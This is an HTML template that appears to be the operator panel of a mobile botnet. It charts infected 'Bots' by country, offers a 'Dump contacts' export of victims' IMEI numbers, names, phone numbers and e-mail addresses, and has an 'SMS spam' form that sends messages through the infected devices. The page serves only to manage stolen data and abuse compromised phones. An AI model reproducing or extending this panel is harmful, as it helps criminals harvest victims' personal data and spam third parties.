
<div class="demo-charts mdl-shadow--2dp mdl-cell mdl-cell--12-col mdl-grid" style="background-color: #37474f;">	
            <h5 style="color: white;"><i class="material-icons" style="color: white; margin-right: 20px;">poll</i>Total Contacts: %%ALL_CONTACTS_COUNT%%</h5>
</div>
<div  class="demo-charts mdl-color--white mdl-shadow--2dp mdl-cell mdl-cell--12-col mdl-grid">
	<div style="margin-left: 10px;">
		<h5>Country statistics</h5>
		<div id="pie-chart"></div>
		<script type="text/javascript">
	  	google.load("visualization", "1", {packages:["corechart"]});
		google.setOnLoadCallback(drawCharts);
			function drawCharts() {
				var pieData = google.visualization.arrayToDataTable([
			    ['Country', 'Bots'],
			    %%PLACE_COUNTRY_STAT_HERE%%
			  ]);
			  // pie chart options
			  var pieOptions = {
			    backgroundColor: 'transparent',
			    pieHole: 0.4,
			    colors: [ "cornflowerblue", 
			              "olivedrab", 
			              "orange", 
			              "tomato", 
			              "crimson", 
			              "purple", 
			              "turquoise", 
			              "forestgreen", 
			              "navy", 
			              "gray","#39ca74","#e54d42","#f0c330","#3999d8","#35485d", "#FE2E2E", "#B40404", "#610B0B", "#FE9A2E", "#B45F04","#3B240B", "#2EFE2E", "#04B404","#0B610B", "#58FAF4", "#04B4AE","#0B615E", "#FA58F4", "#DF01D7","#610B5E", "#F781BE", "#DF0174","#610B38"],
			    pieSliceText: 'value',
			    tooltip: {
			      text: 'percentage'
			    },
			    fontName: 'Open Sans',
			    chartArea: {
			      width: '100%',
			      height: '94%'
			    },
			    legend: {
			      textStyle: {
			        fontSize: 13
			      }
			    }
			  };
			  // draw bar chart twice so it animates
			  var pieChart = new google.visualization.PieChart(document.getElementById('pie-chart'));
	  			pieChart.draw(pieData, pieOptions);
			};
	  </script>
	</div>

	<div style="width: 400px;margin-top: 20px;padding:20px;" class="demo-charts mdl-color--white mdl-shadow--2dp">
		<div style="width: 100%;margin-top: 10px;">
			<h5>Dump contacts</h5>
			<select id="dump_country" class="demo-list-icon mdl-list" style="float: left; margin-right: 15px;margin-top: 20px;">
				<option value="" disabled selected>Choose country</option>
				%%PLACE_COUNTRY_OPTIONS%%
		    </select>
		    <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label" style="width: 80px;">
			    <input class="mdl-textfield__input" pattern="[0-9]*(\.[0-9]+)?" type="text" id="dump_limit">
			    <label class="mdl-textfield__label" for="dump_limit">Limit...</label>
			</div>
			<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label" style="width: 80px;">
			    <input class="mdl-textfield__input" type="text" id="dump_separator" value=":">
			    <label class="mdl-textfield__label" for="dump_separator">Separator...</label>
			</div>
			
		</div>
		<div style="width: 100%;margin-top: 10px;">
			<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="dump_checkbox_imei">
			  <input type="checkbox" id="dump_checkbox_imei" class="mdl-checkbox__input">
			  <span class="mdl-checkbox__label">IMEI</span>
			</label>
			<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="dump_checkbox_name">
			  <input type="checkbox" id="dump_checkbox_name" class="mdl-checkbox__input" checked>
			  <span class="mdl-checkbox__label">Name</span>
			</label>
			<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="dump_checkbox_country">
			  <input type="checkbox" id="dump_checkbox_country" class="mdl-checkbox__input">
			  <span class="mdl-checkbox__label">Country</span>
			</label>
			<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="dump_checkbox_phone">
			  <input type="checkbox" id="dump_checkbox_phone" class="mdl-checkbox__input" checked>
			  <span class="mdl-checkbox__label">Phone</span>
			</label>
			<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="dump_checkbox_ename">
			  <input type="checkbox" id="dump_checkbox_ename" class="mdl-checkbox__input">
			  <span class="mdl-checkbox__label">Email name</span>
			</label>
			<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="dump_checkbox_email">
			  <input type="checkbox" id="dump_checkbox_email" class="mdl-checkbox__input">
			  <span class="mdl-checkbox__label">E-mail</span>
			</label>
		</div>
		<button style="width: 390px;margin-top: 10px;" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect" onclick='get_contact_file();'><i class="material-icons">file_download</i>Get file
		</button>
	</div>
	<div style="width: 400px;margin-top: 20px;padding:20px;" class="demo-charts mdl-color--white mdl-shadow--2dp">
		<div style="width: 100%;margin-top: 10px;">
			<h5>SMS spam</h5>
		</div>
		<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label" style="width: 98%;">
			<input class="mdl-textfield__input" type="text" id="sms_mess" >
			<label class="mdl-textfield__label" for="sms_mess">Message...</label>
		</div>
		<div class="styled-select">
		    <span style="color: #000000;">Numbers:</span>
			<textarea id="sms_num" wrap="virtual" class="SMSnum"></textarea>			
		</div>			
		<button style="width: 390px;margin-top: 10px;" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect" onclick='sendSMSspam();'><i class="material-icons">file_upload</i>Send spam
		</button>
	</div>

</div>

<!--<table class="footable" cellpadding="1" align="center" border="1"  width=100%>
    <thead>
		<th>IMEI</th>
		<th>Name</th>
		<th>Country</th>
		<th>Phone</th>
		<th><input type="checkbox" id="chk_new" onclick="checkAll('chk');" /></th>
	</thead>
	<tbody>
	%%PLACE_TABLE_HERE%%
	</tbody>
</table>-->

<div style="width: 100%">
<!--<center>%%PLACE_PAGES_BOTTOM_HERE%%</center>-->
</div>
<br>
<br>